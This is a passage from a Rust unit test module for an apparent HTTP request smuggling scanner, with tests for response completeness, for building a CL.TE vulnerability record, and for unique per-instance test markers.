        let response4 = "HTTP/1.1 204 No Content\r\n\r\n";
        assert!(scanner.is_complete_http_response(response4));
    }

    #[test]
    fn test_create_vulnerability() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com",
            "CL.TE",
            "test payload",
            "CL.TE smuggling detected",
            "Test evidence",
            Severity::Critical,
        );

        assert_eq!(vuln.vuln_type, "HTTP Request Smuggling (CL.TE)");
        assert_eq!(vuln.severity, Severity::Critical);
        assert_eq!(vuln.confidence, Confidence::High);
        assert_eq!(vuln.cwe, "CWE-444");
        assert_eq!(vuln.cvss, 9.8);
        assert!(vuln.verified);
    }

    #[test]
    fn test_unique_test_marker() {
        let scanner1 = create_test_scanner();
        let scanner2 = create_test_scanner();

        assert_ne!(scanner1.test_marker, scanner2.test_marker);
        assert!(scanner1.test_marker.starts_with("hs_"));
    }
}
